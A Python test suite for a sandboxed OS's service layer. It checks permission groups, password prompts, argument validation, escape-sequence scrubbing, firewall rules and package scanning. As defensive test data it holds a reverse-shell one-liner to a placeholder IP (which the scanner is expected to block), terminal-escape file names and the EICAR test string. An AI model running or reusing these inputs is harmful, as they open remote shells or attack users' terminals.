"""The service layer: how a sandboxed app asks the OS for its own functions
(kos/servicespec.py, kos/services.py, and the wiring in protocol, session and sdk).

The rule under test: an app gets nothing the manifest did not ask for, nothing without the
password typed in the OS's own prompt, and nothing it can use to attack the owner's terminal.
Each refusal sits next to the allowance that proves the rule, not a broken fixture, said no."""

from __future__ import annotations

import json
import os
import socket
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from kos import firewall, loader, services, servicespec  # noqa: E402
from kos.auth import AuditLog, Authority, KdfParams, PasswordStore, Throttle  # noqa: E402
from kos.cmdsurface import CmdSurface  # noqa: E402
from kos.devices import ScriptedDevices  # noqa: E402
from kos.kapp import KApp, KAppError, pack  # noqa: E402
from kos.paths import Paths  # noqa: E402
from kos.permit import PermitStore  # noqa: E402
from kos.prompt import ScriptedPrompter  # noqa: E402
from kos.protocol import Channel, ProtocolError, validate_app_message  # noqa: E402
from kos.sandbox import SandboxPolicy  # noqa: E402
from kos.scan import EICAR  # noqa: E402
from kos.services import HANDLERS, ServiceHost  # noqa: E402
from kos.session import Session  # noqa: E402
from kos.store import AppStore  # noqa: E402
from kos.tui import TUISurface  # noqa: E402

PW = "correct horse battery"
HELLO = Path(__file__).resolve().parent.parent / "examples" / "hello"
ENTER = {"type": "key", "key": "enter"}


def keys(text):
    return [{"type": "key", "key": c} for c in text]


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        os.chmod(self.tmp.name, 0o755)
        self.root = Path(self.tmp.name)
        self.paths = Paths(self.root)
        PasswordStore(self.paths).create(PW.encode(), KdfParams.fresh(n=2**10), throttle_base=0)
        self.addCleanup(self.tmp.cleanup)

    def authority(self, *answers):
        self.prompter = ScriptedPrompter(answers)
        return Authority(self.paths, self.prompter, Throttle(self.paths, base=0))

    def host(self, *groups, caller="tester"):
        return ServiceHost(self.paths, caller, frozenset(groups))

    def call(self, host, name, args=None, *answers, id=1):
        """One service call as the session would make it: validated, then handed to the host."""
        msg = validate_app_message({"cmd": "service", "id": id, "name": name, "args": args or {}}, "tui")
        return host.call(msg, self.authority(*answers))


class TestTheSchema(unittest.TestCase):
    def test_every_spec_has_a_handler_and_every_handler_a_spec(self):
        self.assertEqual(set(HANDLERS), set(servicespec.SPECS))

    def test_a_handler_is_given_exactly_the_arguments_its_spec_declares(self):
        import inspect
        for name, spec in servicespec.SPECS.items():
            params = [p for p in inspect.signature(HANDLERS[name]).parameters][1:]       # after ctx
            self.assertEqual(sorted(params), sorted(spec.args), name)

    def test_defaults_fill_in_and_unknown_arguments_are_refused(self):
        spec = servicespec.SPECS["audit.tail"]
        self.assertEqual(spec.check({}), {"n": 100})
        self.assertEqual(spec.check({"n": 5}), {"n": 5})
        with self.assertRaises(servicespec.SpecError):
            spec.check({"n": 5, "also": 1})

    def test_hostile_arguments_never_reach_a_handler(self):
        bad = [
            ("audit.tail", {"n": 0}), ("audit.tail", {"n": 501}), ("audit.tail", {"n": True}),
            ("audit.tail", {"n": "5"}), ("audit.tail", {"n": 5.0}),
            ("audit.tail", []), ("audit.tail", "n=5"), ("audit.tail", {"n": 5, "x": 1}),
            ("files.list", {}), ("files.list", {"path": None}), ("files.list", {"path": ""}), ("files.list", {"path": "x" * 1025}),
            ("files.list", {"path": "a\x00b"}), ("files.list", {"path": "a\x1b[2Jb"}),
            ("files.list", {"path": "a‮b"}), ("files.list", {"path": 5}), ("files.list", {"path": ["a"]}),
            ("files.read", {"path": "/x", "limit": 0}), ("files.read", {"path": "/x", "limit": 262_145}),
            ("firewall.allow", {"app": "web", "proto": "tcp", "direction": "connect", "host": "1.2.3.4"}),   # no port
            ("firewall.allow", {"app": "Web", "proto": "tcp", "direction": "connect", "host": "1.2.3.4", "port": 80}),
            ("firewall.allow", {"app": "web", "proto": "icmp", "direction": "connect", "host": "1.2.3.4", "port": 80}),
            ("firewall.allow", {"app": "web", "proto": "tcp", "direction": "bind", "host": "1.2.3.4", "port": 80}),
            ("firewall.allow", {"app": "web", "proto": "tcp", "direction": "connect", "host": "1.2.3.4", "port": 0}),
            ("firewall.allow", {"app": "web", "proto": "tcp", "direction": "connect", "host": "1.2.3.4", "port": 70000}),
            ("firewall.allow", {"app": "../x", "proto": "tcp", "direction": "connect", "host": "1.2.3.4", "port": 80}),
            ("cells.start", {"name": "c", "kernel": "/k", "initrd": "/i", "memory": 8, "cpus": ["1"]}),
            ("cells.start", {"name": "c", "kernel": "/k", "initrd": "/i"}),                       # no cpus
            ("cells.start", {"name": "c", "kernel": "/k", "initrd": "/i", "cpus": ["1"] * 17}),
            ("cells.start", {"name": "c", "kernel": "/k", "initrd": "/i", "cpus": [1]}),
            ("packages.permit", {"name": "hello", "revoke": "yes"}),
            ("permissions.grant", {"app": "a", "space": "s", "level": "own"}),
            ("code.run", {"code": "x" * 20_001}), ("code.run", {"code": "1\x00"}), ("code.run", {}),
            ("no.such.service", {}), ("__import__", {}), ("audit", {}), ("", {}),
        ]
        for name, args in bad:
            with self.subTest(name=name, args=str(args)[:60]):
                with self.assertRaises(ProtocolError):
                    validate_app_message({"cmd": "service", "id": 1, "name": name, "args": args}, "tui")

    def test_a_service_message_without_a_valid_id_or_name_is_refused(self):
        for msg in ({"cmd": "service", "name": "audit.tail"}, {"cmd": "service", "id": -1, "name": "audit.tail"},
                    {"cmd": "service", "id": "1", "name": "audit.tail"}, {"cmd": "service", "id": 1},
                    {"cmd": "service", "id": 1, "name": 5}, {"cmd": "service", "id": 2**31 + 1, "name": "audit.tail"}):
            with self.assertRaises(ProtocolError, msg=str(msg)):
                validate_app_message(msg, "tui")

    def test_checking_twice_gives_the_same_answer(self):
        """The host checks a message the protocol already normalised; defaults (including None) must survive that."""
        for name, spec in servicespec.SPECS.items():
            args = {k: a.default for k, a in spec.args.items() if not a.required}
            if any(a.required for a in spec.args.values()):
                continue
            once = spec.check(args)
            self.assertEqual(spec.check(once), once, name)
        spec = servicespec.SPECS["packages.convert"]
        once = spec.check({"path": "/a.deb", "out": "/b.kapp"})
        self.assertEqual(once["exe"], None)
        self.assertEqual(spec.check(once), once)
        self.assertEqual(spec.check({**once, "exe": None}), once)
        with self.assertRaises(servicespec.SpecError):
            spec.check({**once, "exe": 5})
        with self.assertRaises(servicespec.SpecError):
            servicespec.SPECS["files.list"].check({"path": None})            # a required argument is not optional

    def test_a_good_call_is_accepted_and_normalised(self):
        m = validate_app_message({"cmd": "service", "id": 4, "name": "files.read", "args": {"path": "/etc/hostname"},
                                  "junk": 1}, "tui")
        self.assertEqual(m, {"cmd": "service", "id": 4, "name": "files.read",
                            "args": {"path": "/etc/hostname", "limit": 65_536}})


class TestServicesWithArgumentsCalledNameAndHost(unittest.TestCase):
    """Services have arguments called 'name' and 'host'. The calling functions must not choke on them."""

    def test_the_sdk_the_hosts_and_the_suite_helper_pass_such_arguments_through(self):
        from kos.office.ui import AppHost, FakeHost
        sent = []

        class FakeApp:
            vault_error = ""

            def service(self, name, /, **args):
                sent.append((name, args))
                return {"ok": True, "detail": "", "data": {}}
        AppHost(FakeApp()).call("packages.remove", name="hello")
        AppHost(FakeApp()).call("firewall.allow", app="web", host="1.2.3.4", port=80)
        self.assertEqual(sent, [("packages.remove", {"name": "hello"}),
                                ("firewall.allow", {"app": "web", "host": "1.2.3.4", "port": 80})])
        h = FakeHost([], services=lambda n, a: {"ok": True, "data": {}})
        h.call("cells.stop", name="c1")
        self.assertEqual(h.service_calls, [("cells.stop", {"name": "c1"})])
        import inspect
        from kos.sdk import App
        self.assertIs(inspect.signature(App.service).parameters["name"].kind, inspect.Parameter.POSITIONAL_ONLY)


class TestManifestPermission(unittest.TestCase):
    def manifest(self, perms, **extra):
        d = {"name": "x", "version": "1", "runtime": "python", "entry": "app:main", "permissions": perms, **extra}
        return KApp.from_bytes(self.zip(d)).manifest if hasattr(KApp, "from_bytes") else None

    def zip(self, manifest):
        import io
        import zipfile
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("manifest.json", json.dumps(manifest))
            z.writestr("app.py", "def main(): pass\n")
            if manifest.get("kind", "app") != "app":
                z.writestr("extension.json", json.dumps({"entries": []}))
        return buf.getvalue()

    def test_an_app_may_ask_for_a_known_group_and_no_other(self):
        ok = KApp(self.zip({"name": "x", "version": "1", "runtime": "python", "entry": "app:main",
                            "modes": ["tui", "text", "graphical"],
                            "permissions": ["service:audit", "service:files"]}))
        self.assertEqual(ok.manifest.permissions, ("service:audit", "service:files"))
        for bad in ("service:", "service:Audit", "service:nothing", "service:audit.tail", "service", "services:audit"):
            with self.subTest(bad=bad), self.assertRaises(KAppError):
                KApp(self.zip({"name": "x", "version": "1", "runtime": "python", "entry": "app:main",
                               "modes": ["tui", "text", "graphical"], "permissions": [bad]}))

    def test_an_extension_or_a_mod_can_never_ask_the_os_for_anything(self):
        for kind, extends in (("extension", "hello"), ("mod", "taskbar")):
            with self.subTest(kind=kind), self.assertRaises(KAppError):
                KApp(self.zip({"name": "x", "version": "1", "runtime": "python", "entry": "app:main", "kind": kind,
                               "extends": extends, "permissions": ["service:audit"]}))


class TestTheDoor(Base):
    def test_an_app_without_the_group_in_its_manifest_is_refused_before_any_password(self):
        r = self.call(self.host("files"), "audit.tail")                # no answers: a prompt would raise
        self.assertFalse(r["ok"])
        self.assertIn("service:audit", r["detail"])
        self.assertEqual(r["data"], {})

    def test_an_app_with_no_groups_at_all_gets_nothing(self):
        self.assertFalse(self.call(self.host(), "audit.tail")["ok"])

    def test_the_group_it_has_works_with_the_password(self):
        r = self.call(self.host("audit"), "audit.tail", {"n": 5}, PW)
        self.assertTrue(r["ok"], r)
        self.assertTrue(any(e["action"] == "audit.read" and e["outcome"] == "granted" for e in r["data"]["entries"]) or
                        any(e["action"] == "audit.read" for e in AuditLog(self.paths).entries()))

    def test_a_wrong_or_cancelled_password_returns_no_data(self):
        for answers in (("no", "no", "no"), (None,)):
            r = self.call(self.host("audit"), "audit.tail", {}, *answers)
            self.assertFalse(r["ok"])
            self.assertEqual(r["data"], {})
            self.assertTrue(any(e["action"] == "audit.read" and e["outcome"] in ("denied", "cancelled")
                                for e in AuditLog(self.paths).entries()))

    def test_the_reply_carries_the_id_of_the_call(self):
        self.assertEqual(self.call(self.host("audit"), "audit.tail", {}, PW, id=77)["id"], 77)
        self.assertEqual(self.call(self.host(), "audit.tail", {}, id=78)["id"], 78)

    def test_everything_returned_is_scrubbed_of_terminal_tricks(self):
        AuditLog(self.paths).record("file.view", "evil\x1b[2J\x1b]0;pwned\x07name‮txt", "granted")
        r = self.call(self.host("audit"), "audit.tail", {"n": 20}, PW)
        blob = json.dumps(r["data"], ensure_ascii=False)
        self.assertNotIn("\x1b", blob)
        self.assertNotIn("‮", blob)
        self.assertIn("\\x1b", blob)

    def test_a_handler_that_crashes_does_not_take_the_session_down_or_leak_a_traceback(self):
        with mock.patch.dict(HANDLERS, {"audit.tail": mock.Mock(side_effect=RuntimeError("secret detail /etc/shadow"))}):
            r = self.call(self.host("audit"), "audit.tail")
        self.assertFalse(r["ok"])
        self.assertNotIn("shadow", r["detail"])
        self.assertIn("internal error", r["detail"])

    def test_a_reply_that_is_too_large_is_refused_not_sent(self):
        with mock.patch.dict(HANDLERS, {"audit.tail": lambda ctx, n: {"x": ["y" * 100_000] * 8}}):
            r = self.call(self.host("audit"), "audit.tail", {})
        self.assertFalse(r["ok"])
        self.assertIn("too large", r["detail"])

    def test_the_host_checks_the_arguments_again_itself(self):
        # a message that skipped the protocol (a bug elsewhere) is still checked at the door
        r = self.host("audit").call({"cmd": "service", "id": 1, "name": "audit.tail", "args": {"n": -4}}, self.authority())
        self.assertFalse(r["ok"])
        r = self.host("audit").call({"cmd": "service", "id": 1, "name": "nothing.here", "args": {}}, self.authority())
        self.assertFalse(r["ok"])


class TestReadingTheOS(Base):
    def test_activity_security_and_system_each_ask_for_the_password_and_return_data(self):
        r = self.call(self.host("activity"), "activity.feed", {"n": 10}, PW)
        self.assertTrue(r["ok"], r)
        self.assertIn("items", r["data"])
        r = self.call(self.host("security"), "security.check", {}, PW)
        self.assertTrue(r["ok"], r)
        self.assertTrue(r["data"]["checks"])
        self.assertEqual(set(r["data"]), {"checks", "failed", "warned"})
        r = self.call(self.host("system"), "system.report", {}, PW)
        self.assertTrue(r["ok"], r)
        self.assertTrue(r["data"]["password_configured"])
        self.assertIn("kos_kernel", r["data"])
        self.assertIn("present", r["data"]["kos_kernel"])
        r = self.call(self.host("system"), "system.firmware", {"plan": True}, PW)
        self.assertTrue(r["ok"], r)
        self.assertIn("plan", r["data"])
        for h, name in (("activity", "activity.feed"), ("security", "security.check"), ("system", "system.report")):
            self.assertFalse(self.call(self.host(h), name, {}, "no", "no", "no")["ok"], name)

    def test_audit_verify_reports_a_broken_chain(self):
        r = self.call(self.host("audit"), "audit.verify", {}, PW)
        self.assertTrue(r["ok"], r)
        self.assertTrue(r["data"]["ok"], r["data"])
        for i in range(4):
            AuditLog(self.paths).record("file.view", f"/x/{i}", "granted")
        lines = AuditLog(self.paths).file.read_text().splitlines()
        self.assertGreater(len(lines), 3)
        AuditLog(self.paths).file.write_text("\n".join(lines[:1] + lines[2:]) + "\n")     # delete one line
        r = self.call(self.host("audit"), "audit.verify", {}, PW)
        self.assertTrue(r["ok"])
        self.assertFalse(r["data"]["ok"], "the service must report tampering, not hide it")

    def test_maintenance_owed_is_empty_on_a_new_system(self):
        r = self.call(self.host("maintenance"), "maintenance.owed", {}, PW)
        self.assertEqual((r["ok"], r["data"]), (True, {"owed": []}))

    def test_optimize_asks_for_its_own_password_action(self):
        r = self.call(self.host("maintenance"), "maintenance.optimize", {}, PW)
        self.assertTrue(r["ok"], r)
        self.assertIn("reclaimed", r["data"]["summary"])
        self.assertTrue(any(e["action"] == "disk.optimize" for e in AuditLog(self.paths).entries()))


class TestFiles(Base):
    def setUp(self):
        super().setUp()
        self.d = self.root / "docs"
        self.d.mkdir()
        (self.d / "note.txt").write_text("hello\tworld\nline two\n")
        (self.d / "bin.dat").write_bytes(b"\x00\x01\x02binary")
        (self.d / "evil\x1b[31m.txt").write_text("x")
        pack(HELLO, self.d / "hello.kapp")

    def test_listing_needs_the_password_and_shows_a_zip_as_a_directory(self):
        r = self.call(self.host("files"), "files.list", {"path": str(self.d)}, PW)
        self.assertTrue(r["ok"], r)
        names = {e["name"]: e for e in r["data"]["entries"]}
        self.assertTrue(names["hello.kapp"]["zip"])
        self.assertIn("note.txt", names)
        r = self.call(self.host("files"), "files.list", {"path": str(self.d / "hello.kapp")}, PW)
        self.assertTrue(r["ok"], r)
        self.assertIn("manifest.json", {e["name"] for e in r["data"]["entries"]})
        self.assertFalse(self.call(self.host("files"), "files.list", {"path": str(self.d)}, "no", "no", "no")["ok"])

    def test_a_hostile_file_name_cannot_reach_the_terminal(self):
        r = self.call(self.host("files"), "files.list", {"path": str(self.d)}, PW)
        blob = json.dumps(r["data"])
        self.assertNotIn("\x1b", blob)
        self.assertIn("\\x1b", blob)

    def test_reading_returns_text_with_tabs_expanded_and_flags_binary(self):
        r = self.call(self.host("files"), "files.read", {"path": str(self.d / "note.txt")}, PW)
        self.assertIn("hello    world", r["data"]["text"])
        self.assertFalse(r["data"]["binary"])
        r = self.call(self.host("files"), "files.read", {"path": str(self.d / "bin.dat")}, PW)
        self.assertTrue(r["data"]["binary"])

    def test_reading_inside_a_zip_never_extracts_it(self):
        before = sorted(p.name for p in self.d.iterdir())
        r = self.call(self.host("files"), "files.read", {"path": str(self.d / "hello.kapp" / "manifest.json")}, PW)
        self.assertTrue(r["ok"], r)
        self.assertIn('"name"', r["data"]["text"])
        self.assertEqual(sorted(p.name for p in self.d.iterdir()), before)

    def test_the_limit_bounds_what_is_returned(self):
        (self.d / "big.txt").write_text("a" * 10_000)
        r = self.call(self.host("files"), "files.read", {"path": str(self.d / "big.txt"), "limit": 100}, PW)
        self.assertEqual((r["data"]["size"], r["data"]["shown"], len(r["data"]["text"])), (10_000, 100, 100))

    def test_a_missing_file_or_a_path_through_a_file_is_a_reason_not_a_crash(self):
        for p in (self.d / "nope.txt", self.d / "note.txt" / "inside", Path("/nonexistent/deep/er")):
            r = self.call(self.host("files"), "files.read", {"path": str(p)}, PW)
            self.assertFalse(r["ok"], p)
            self.assertTrue(r["detail"])

    def test_dot_dot_cannot_escape_to_something_the_listing_would_not_show(self):
        r = self.call(self.host("files"), "files.list", {"path": str(self.d / ".." / ".." / "..")}, PW)
        self.assertTrue(r["ok"], r)                                 # it resolves to the real root, like ls would
        self.assertEqual(r["data"]["path"], "/")

    def test_scan_flags_the_test_virus_and_passes_a_clean_file(self):
        (self.d / "eicar.txt").write_bytes(EICAR)
        r = self.call(self.host("scan"), "scan.file", {"path": str(self.d / "eicar.txt")}, PW)
        self.assertTrue(r["ok"], r)
        self.assertFalse(r["data"]["clean"])
        self.assertTrue(r["data"]["findings"])
        r = self.call(self.host("scan"), "scan.file", {"path": str(self.d / "note.txt")}, PW)
        self.assertTrue(r["data"]["clean"])


class TestFirewallService(Base):
    RULE = {"app": "web", "proto": "tcp", "direction": "connect", "host": "93.184.216.34", "port": 443}

    def test_a_rule_that_is_not_one_host_one_port_is_refused_before_the_password(self):
        for host in ("example.com", "10.0.0.0/8", "*", "0.0.0.0", "224.0.0.1", "1.2.3.4 ", "fe80::1%lo"):
            r = self.call(self.host("firewall"), "firewall.allow", {**self.RULE, "host": host})   # no answers
            self.assertFalse(r["ok"], host)

    def test_allow_list_remove_each_ask_for_the_password(self):
        h = self.host("firewall")
        r = self.call(h, "firewall.allow", self.RULE, PW)
        self.assertTrue(r["ok"], r)
        self.assertTrue(r["data"]["added"])
        self.assertIn("next time", r["data"]["note"])
        self.assertFalse(self.call(h, "firewall.allow", self.RULE, PW)["data"]["added"], "twice is one rule")
        r = self.call(h, "firewall.list", {}, PW)
        self.assertTrue(r["ok"], r)
        self.assertEqual(r["data"]["rules"], [self.RULE])
        self.assertEqual(r["data"]["state"], "ok")
        self.assertIn("present", r["data"]["kernel"])
        r = self.call(h, "firewall.remove", self.RULE, PW)
        self.assertTrue(r["data"]["removed"])
        self.assertEqual(self.call(h, "firewall.list", {}, PW)["data"]["rules"], [])
        actions = [(e["action"], e["target"]) for e in AuditLog(self.paths).entries() if e["action"].startswith("firewall.")]
        self.assertIn(("firewall.change", "allow web tcp connect 93.184.216.34:443"), actions)

    def test_a_wrong_password_changes_nothing(self):
        r = self.call(self.host("firewall"), "firewall.allow", self.RULE, "no", "no", "no")
        self.assertFalse(r["ok"])
        self.assertEqual(firewall.FirewallStore(self.paths).load(b"x" * 32), ([], "empty"))

    def test_a_rule_file_edited_without_the_password_is_reported_and_refuses_new_rules(self):
        h = self.host("firewall")
        self.call(h, "firewall.allow", self.RULE, PW)
        store = firewall.FirewallStore(self.paths)
        raw = json.loads(store.file.read_text())
        raw["rules"].append({**self.RULE, "app": "evil", "host": "6.6.6.6"})
        store.file.write_text(json.dumps(raw))
        r = self.call(h, "firewall.list", {}, PW)
        self.assertEqual((r["ok"], r["data"]["state"], r["data"]["rules"]), (True, "tampered", []))
        self.assertFalse(self.call(h, "firewall.allow", {**self.RULE, "port": 80}, PW)["ok"])

    def test_the_other_groups_cannot_touch_the_firewall(self):
        self.assertFalse(self.call(self.host("files", "audit", "system"), "firewall.allow", self.RULE)["ok"])


class TestPackages(Base):
    def setUp(self):
        super().setUp()
        self.kapp = self.root / "hello.kapp"
        pack(HELLO, self.kapp)

    def test_install_permit_list_revoke_remove(self):
        h = self.host("packages")
        r = self.call(h, "packages.install", {"path": str(self.kapp)}, PW)
        self.assertTrue(r["ok"], r)
        self.assertEqual(r["data"]["name"], "hello")
        self.assertFalse(PermitStore(self.paths).is_permitted("hello"))
        r = self.call(h, "packages.permit", {"name": "hello"}, PW)
        self.assertTrue(r["data"]["permitted"])
        self.assertTrue(PermitStore(self.paths).is_permitted("hello"))
        r = self.call(h, "packages.list", {}, PW)
        self.assertEqual([(a["name"], a["permitted"]) for a in r["data"]["apps"]], [("hello", True)])
        self.assertTrue(self.call(h, "packages.permit", {"name": "hello", "revoke": True}, PW)["ok"])
        self.assertFalse(PermitStore(self.paths).is_permitted("hello"))
        self.assertTrue(self.call(h, "packages.remove", {"name": "hello"}, PW)["ok"])
        self.assertEqual(AppStore(self.paths).installed(), [])

    def test_a_flagged_package_is_refused_before_any_password(self):
        bad = self.root / "bad.kapp"
        d = self.root / "bad"
        d.mkdir()
        (d / "manifest.json").write_text(json.dumps({"name": "bad", "version": "1", "runtime": "python", "entry": "app:main"}))
        (d / "app.py").write_text("def main(): pass\n")
        (d / "eicar.txt").write_bytes(EICAR)
        pack(d, bad)
        r = self.call(self.host("packages"), "packages.install", {"path": str(bad)})        # no answers
        self.assertFalse(r["ok"])
        self.assertEqual(AppStore(self.paths).installed(), [])

    def test_permit_of_something_that_is_not_installed_is_a_reason(self):
        r = self.call(self.host("packages"), "packages.permit", {"name": "ghost"}, PW)
        self.assertFalse(r["ok"])

    def test_grant_and_revoke_a_shared_folder(self):
        h = self.host("permissions")
        r = self.call(h, "permissions.grant", {"app": "reader", "space": "contacts", "level": "read"}, PW)
        self.assertTrue(r["ok"], r)
        r = self.call(h, "permissions.list", {}, PW)
        self.assertEqual(r["data"]["grants"], [{"space": "contacts", "app": "reader", "level": "read"}])
        r = self.call(h, "permissions.grant", {"app": "reader", "space": "contacts", "revoke": True}, PW)
        self.assertTrue(r["data"]["revoked"])
        self.assertEqual(self.call(h, "permissions.list", {}, PW)["data"]["grants"], [])

    def test_nobody_can_take_over_a_space_by_granting_themselves_own(self):
        from kos.permissions import Permissions
        Permissions(self.paths).grant("owner-app", "space:contacts", "own")
        r = self.call(self.host("permissions"), "permissions.grant",
                      {"app": "owner-app", "space": "contacts", "level": "read"}, PW)
        self.assertFalse(r["ok"])
        self.assertIn("owns", r["detail"])


class TestCodeService(Base):
    def test_code_is_scanned_then_needs_the_password_then_runs_in_the_sandbox(self):
        r = self.call(self.host("code"), "code.run", {"code": "print(6 * 7)"}, PW)
        self.assertTrue(r["ok"], r)
        self.assertEqual((r["data"]["status"], r["data"]["output"]), (0, ["42"]))

    def test_flagged_code_is_stopped_before_any_password(self):
        r = self.call(self.host("code"), "code.run", {"code": "import os; os.system('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1')"})
        self.assertTrue(r["ok"])
        self.assertEqual(r["data"]["status"], 3)
        self.assertTrue(any("security scan" in l for l in r["data"]["output"]))


# ---- a real sandboxed app asking over the real channel -------------------------------------------------

APP = '''
from kos.sdk import App

def main():
    app = App()
    for ev in app.events():
        if ev.get("cmd") == "hello":
            r = app.service("audit.tail", n=2)
            app.log("RESULT ok=%s detail=%s n=%s" % (r.get("ok"), r.get("detail"), len(r.get("data", {}).get("entries", []))))
            r = app.service("firewall.list")
            app.log("DENIED ok=%s detail=%s" % (r.get("ok"), r.get("detail")))
            app.exit(0)
'''


class TestARealAppAsksTheOS(Base):
    def services_for(self, permissions):
        from kos.cli import _services_for           # the same function `kos run` uses
        return _services_for(self.paths, "askapp", permissions)

    def run_app(self, permissions):
        d = self.root / "askapp"
        d.mkdir(exist_ok=True)
        (d / "manifest.json").write_text(json.dumps({"name": "askapp", "version": "1", "runtime": "python",
                                                     "entry": "app:main", "permissions": permissions,
                                                     "modes": ["tui", "text", "graphical"]}))
        (d / "app.py").write_text(APP)
        kapp = self.root / "askapp.kapp"
        pack(d, kapp)
        store = AppStore(self.paths)
        store.install(kapp, self.authority(PW))
        PermitStore(self.paths).grant("askapp")
        with self.authority(PW).authorize("app.run", "askapp") as g:
            app = store.load_verified("askapp", g)
        a, b = socket.socketpair()
        proc = loader.launch(loader.plan(app, b.fileno(), "tui", None, ""), SandboxPolicy(), None)
        b.close()
        self.devices = ScriptedDevices()
        out = tempfile.TemporaryFile()
        self.addCleanup(out.close)
        auth = Authority(self.paths, None, Throttle(self.paths, base=0))
        logs = []

        class Log:
            def write(self, s): logs.append(s)
            def flush(self): pass
        session = Session(name="askapp", mode="tui", channel=Channel(a), proc=proc,
                          surface=TUISurface(out.fileno(), 100, 30, "askapp"), devices=self.devices, authority=auth,
                          log=Log(), services=self.services_for(permissions))

        def watch():
            end = time.monotonic() + 20
            while time.monotonic() < end:
                m = session.surface.modal
                if m is not None and "authorization log" in m.title:
                    self.devices.push(*keys(PW), ENTER)
                    return
                time.sleep(0.02)
        t = threading.Thread(target=watch, daemon=True)
        t.start()
        code = session.run()
        t.join(1)
        return code, "".join(logs)

    def test_the_app_with_the_permission_gets_the_log_after_the_password_is_typed_in_the_os_prompt(self):
        code, log = self.run_app(["service:audit"])
        self.assertEqual(code, 0)
        self.assertIn("RESULT ok=True", log)
        self.assertIn("n=2", log)
        # it asked for a group it does not have: refused, and no password prompt was ever raised for it
        self.assertIn("DENIED ok=False", log)
        self.assertIn("service:firewall", log)

    def test_the_app_without_the_permission_is_refused_everything(self):
        code, log = self.run_app([])
        self.assertEqual(code, 0)
        self.assertIn("RESULT ok=False", log)
        self.assertIn("no 'service:' permission", log)


if __name__ == "__main__":
    unittest.main()
